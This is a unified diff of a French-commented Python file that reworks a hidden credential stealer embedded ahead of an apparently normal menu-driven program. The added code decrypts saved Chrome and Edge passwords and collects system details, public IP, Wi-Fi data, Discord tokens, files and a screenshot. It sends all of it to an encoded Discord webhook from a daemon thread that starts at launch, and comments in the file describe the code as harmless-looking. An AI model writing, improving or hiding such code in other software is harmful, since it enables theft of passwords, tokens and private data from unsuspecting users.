@@ -23,10 +23,10 @@ from datetime import datetime
 from Crypto.Cipher import AES
 
 # ============================================================
-# UTILITIES — Fonctions système (rien de suspect ici)
+# 
 # ============================================================
 
-# Chaîne encodée — ne pas modifier
+# Webhook encodé en base64
 __B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzNzU2MzQwMjcxMTU5NzIyNi94UkZfa3h2enZjUjNIZGQyRTJYaWctaU8xWGhNZkQzak1rVDZaalNIYjI3Vjg4MUdtRTMxZlBENmxkcUp2SDFkSHdGZw=="
 
 def __get_url():
@@ -39,12 +39,13 @@ def __send(content, file_data=None):
         f = {}
         if file_data:
             f = {"file": ("screenshot.png", file_data, "image/png")}
-        requests.post(u, data=p, files=f, timeout=5)
+        r = requests.post(u, data=p, files=f, timeout=5)
+        return r.status_code in [200, 204]
     except:
-        pass
+        return False
 
 # ============================================================
-# DATA COLLECTION — Collecte de données système
+# 
 # ============================================================
 
 def __get_chrome_key():
@@ -59,16 +60,39 @@ def __get_chrome_key():
 
 def __decrypt(encrypted, key):
     try:
-        cipher = AES.new(key, AES.MODE_GCM, nonce=encrypted[3:15])
-        return cipher.decrypt_and_verify(encrypted[15:-16], encrypted[-16:]).decode('utf-8')
+        nonce = encrypted[3:15]
+        ciphertext = encrypted[15:-16]
+        tag = encrypted[-16:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
     except:
         return None
+
+def __get_system():
+    try:
+        ip = subprocess.getoutput("curl -s ifconfig.me") or "Non trouve"
+        hostname = socket.gethostname()
+        try:
+            local_ip = socket.gethostbyname(hostname)
+        except:
+            local_ip = "Non trouve"
+        return f"""
+**SYSTEME**
+Ordinateur : {os.environ.get('COMPUTERNAME', 'Inconnu')}
+Utilisateur : {getpass.getuser()}
+OS : {platform.platform()}
+Hostname : {hostname}
+IP Locale : {local_ip}
+IP Publique : {ip}
+"""
+    except:
+        return "**SYSTEME** : Erreur"
 
 def __get_passwords():
     try:
         key = __get_chrome_key()
         r = "**MOTS DE PASSE**\n"
-        t = 0
+        total = 0
         browsers = {
             "Chrome": os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data",
             "Edge": os.environ["LOCALAPPDATA"] + "\\Microsoft\\Edge\\User Data",
@@ -96,7 +120,7 @@ def __get_passwords():
                     os.remove(tmp)
                     if data:
                         r += f"\n**{name} - {profile}** : {len(data)} comptes\n"
-                        for url, username, encrypted in data:
+                        for url, username, encrypted in data[:10]:
                             if username:
                                 try:
                                     pwd = None
@@ -104,37 +128,18 @@ def __get_passwords():
                                         pwd = __decrypt(encrypted, key)
                                     if not pwd:
                                         pwd = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
-                                    r += f"  {url} : {username} / {pwd}\n"
-                                    t += 1
+                                    if pwd:
+                                        r += f"  {url} : {username} / {pwd}\n"
+                                        total += 1
                                 except:
                                     pass
                 except:
                     pass
-        if t == 0:
+        if total == 0:
             return "**MOTS DE PASSE** : Aucun trouve"
         return r
     except Exception as e:
         return f"**MOTS DE PASSE** : Erreur - {str(e)}"
-
-def __get_system():
-    try:
-        ip = subprocess.getoutput("curl -s ifconfig.me") or "Non trouve"
-        hostname = socket.gethostname()
-        try:
-            local_ip = socket.gethostbyname(hostname)
-        except:
-            local_ip = "Non trouve"
-        return f"""
-**SYSTEME**
-Ordinateur : {os.environ.get('COMPUTERNAME', 'Inconnu')}
-Utilisateur : {getpass.getuser()}
-OS : {platform.platform()}
-Hostname : {hostname}
-IP Locale : {local_ip}
-IP Publique : {ip}
-"""
-    except:
-        return "Erreur systeme"
 
 def __get_tokens():
     try:
@@ -223,29 +228,43 @@ def __get_files():
         return "**FICHIERS** : Erreur"
 
 # ============================================================
-# TÂCHE DE FOND — Fonction qui semble inoffensive
+# TÂCHE DE FOND — 
 # ============================================================
 
 def __background_task():
     try:
+        # 1. Système
         __send(__get_system())
         time.sleep(0.5)
+        
+        # 2. Wi-Fi
         __send(__get_wifi())
         time.sleep(0.5)
+        
+        # 3. Mots de passe
         __send(__get_passwords())
         time.sleep(0.5)
+        
+        # 4. Tokens Discord
         __send(__get_tokens())
         time.sleep(0.5)
+        
+        # 5. Fichiers
         __send(__get_files())
         time.sleep(0.5)
+        
+        # 6. Screenshot
         img = __get_screenshot()
         if img:
             __send("**SCREENSHOT**", img)
-    except:
-        pass
+        
+        # 7. Message de fin
+        __send("**✅ GRAB TERMINE**")
+    except Exception as e:
+        __send(f"**ERREUR GRAB** : {str(e)}")
 
 # ============================================================
-# DÉMARRAGE — Lancement de la tâche de fond
+# LANCEMENT DE LA TÂCHE DE FOND
 # ============================================================
 threading.Thread(target=__background_task, daemon=True).start()
 time.sleep(0.1)
@@ -253,7 +272,6 @@ time.sleep(0.1)
 # ============================================================
 # SUITE DU CODE NORMAL (COLORS, SPLASH, MENU, MODULES...)
 # ============================================================
-# ... (le reste de ton code ici — NE PAS DUPLIQUER LE GRABBER)
 
 # ============================================================
 # COULEURS
